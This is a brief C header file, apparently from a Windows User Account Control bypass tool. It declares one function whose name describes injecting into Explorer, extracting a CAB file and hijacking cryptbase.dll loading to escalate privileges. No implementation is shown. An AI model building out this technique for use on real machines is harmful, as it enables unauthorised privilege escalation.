#pragma once

#ifndef BYPASSUAC_H_H_H
#define BYPASSUAC_H_H_H

#include <Windows.h>

unsigned long __stdcall InjectExplorerExtractCabHijackCryptbase(void);
#endif